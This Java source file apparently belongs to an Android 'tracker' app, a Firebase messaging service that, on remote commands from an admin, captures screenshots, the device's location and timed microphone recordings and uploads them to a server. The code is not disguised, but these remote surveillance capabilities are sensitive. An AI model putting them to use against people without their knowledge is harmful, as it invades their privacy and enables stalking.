package com.tracker.app.services;

import android.content.Context;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.tracker.app.net.ApiClient;

import java.io.File;
import java.util.Map;

/**
 * Handles incoming FCM messages.
 * When admin sends a 'pull_realtime' command, captures a screenshot
 * and current location, then uploads immediately.
 */
public class TrackerFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "TrackerFCM";

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        Map<String, String> data = remoteMessage.getData();
        String command = data.get("command");

        Log.d(TAG, "FCM message received. Command: " + command);
        MonitoringForegroundService.startServicesIfNeeded(this);

        if ("pull_realtime".equals(command)) {
            handleRealtimePull();
        } else if ("record_audio".equals(command)) {
            String durStr = data.get("duration_seconds");
            int durationSeconds = 120;
            try {
                if (durStr != null) {
                    durationSeconds = Integer.parseInt(durStr);
                }
            } catch (NumberFormatException e) {
                Log.e(TAG, "Invalid duration", e);
            }
            handleAudioRecording(durationSeconds);
        }
    }

    private void handleAudioRecording(final int durationSeconds) {
        new Thread(() -> {
            try {
                int retries = 0;
                while (MonitoringForegroundService.instance == null && retries < 10) {
                    Thread.sleep(500);
                    retries++;
                }

                MonitoringForegroundService service = MonitoringForegroundService.instance;
                if (service != null) {
                    service.startAudioRecording(durationSeconds);
                } else {
                    Log.e(TAG, "Foreground service not available for recording");
                }
            } catch (Exception e) {
                Log.e(TAG, "Audio recording handler error", e);
            }
        }).start();
    }

    @Override
    public void onNewToken(String token) {
        Log.d(TAG, "FCM token refreshed: " + token);
        MonitoringForegroundService.startServicesIfNeeded(this);
        // Update token on server
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences("tracker_prefs", MODE_PRIVATE);
                String apiToken = prefs.getString("api_token", null);
                if (apiToken != null) {
                    ApiClient.updateFcmToken(apiToken, token);
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to update FCM token", e);
            }
        }).start();
    }

    private void handleRealtimePull() {
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences("tracker_prefs", MODE_PRIVATE);
                String apiToken = prefs.getString("api_token", null);
                if (apiToken == null) return;

                // Capture screenshot
                File screenshot = null;
                MonitoringForegroundService service = MonitoringForegroundService.instance;
                if (service != null) {
                    screenshot = service.captureForRealtimePull();
                }

                // Get current location
                double[] location = getCurrentLocation();

                // Upload to server
                ApiClient.uploadRealtimePayload(apiToken, screenshot, location[0], location[1]);

                // Clean up temp file
                if (screenshot != null) {
                    screenshot.delete();
                }

                Log.d(TAG, "Realtime payload uploaded successfully");
            } catch (Exception e) {
                Log.e(TAG, "Realtime pull error", e);
            }
        }).start();
    }

    @SuppressWarnings("MissingPermission")
    private double[] getCurrentLocation() {
        double lat = 0, lng = 0;
        try {
            LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            if (location != null) {
                lat = location.getLatitude();
                lng = location.getLongitude();
            }
        } catch (Exception e) {
            Log.e(TAG, "Location error: " + e.getMessage());
        }
        return new double[]{lat, lng};
    }
}
